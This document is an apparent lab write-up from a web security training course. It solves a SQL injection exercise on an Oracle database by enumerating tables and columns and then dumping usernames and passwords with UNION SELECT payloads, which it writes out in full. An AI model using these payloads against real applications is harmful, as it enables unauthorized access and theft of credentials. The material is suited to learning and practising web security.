# Problem Statement

This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables. The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users. To solve the lab, log in as the administrator user. 

# Solution 

Recall the methods for displaying table information on Oracle databases:

```
SELECT * FROM all_tables

SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'
```

These are the payloads we want to incorporate into our attack. First, we will identify the name of the table with user information, and then the names of columns within that table pertaining to login credentials. 

Assuming an injection context like the following:
```
SELECT * FROM products WHERE category = '%' AND released = 1
```
Where the injection point is represented by the percent sign %, these two payloads will be of the general format:

```
' UNION SELECT * FROM all_tables--

' UNION SELECT * FROM all_tab_columns WHERE table_name = 'USERS_TABLE'--
```
With consideration for the number of columns, we might modify these as such:

```
' UNION SELECT table_name,NULL FROM all_tables--

' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name = 'USERS_TABLE'--
```

Start the lab while proxying through Burp Suite and select a category of product. For this example, we will use the "Gifts" category. In Burp Suite's proxy history, send the request with the /filter?category URL to Burp Repeater. Add a single quote to the end of the query and send the request, observing the error response. Add a double-dash comment sequence after the single quote, and observe the application's "200 OK" response. 

At this point, perform column enumeration using the ORDER BY or NULL method. Identify that there are two columns returned by the query. Use a payload such as the following to list the tables in the database:

```
Gifts' UNION SELECT table_name,NULL FROM all_tables--
```

The application returns a response including the names of several tables in the database. For this example, we identify "USERS_IVHTPB" as the table containing user information. 

![Screen Shot 2023-07-10 at 4 23 08 PM](https://github.com/tatruesdell/WebSecurityAcademy/assets/43506369/c86fe917-dc58-4383-b6fa-105d6287882b)

With this information in hand, we can carry out the next attack:

```
Gifts' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name = 'USERS_IVHTPB'--
```

With the following results:

![Screen Shot 2023-07-10 at 4 26 32 PM](https://github.com/tatruesdell/WebSecurityAcademy/assets/43506369/53bb695c-c68d-4be5-8ccb-98fa9a809f9b)

The above screenshot shows the name of the column containing passwords. 

![Screen Shot 2023-07-10 at 4 27 30 PM](https://github.com/tatruesdell/WebSecurityAcademy/assets/43506369/32c597c1-6dab-4690-92dc-1375d3c06aa9)

This screenshot shows the name of the column containing usernames. 

Now that we have the names of the username and password columns, we might finish with an attack like this:

```
Gifts' UNION SELECT username_fnhjaa,password_puvvdv FROM users_ivhtpb--
```

This payload yields the following data in the response, allowing us to login as the administrator and solve the lab. 

![Screen Shot 2023-07-10 at 4 31 10 PM](https://github.com/tatruesdell/WebSecurityAcademy/assets/43506369/53785c3d-ec0a-46d6-9829-6b633dd65579)
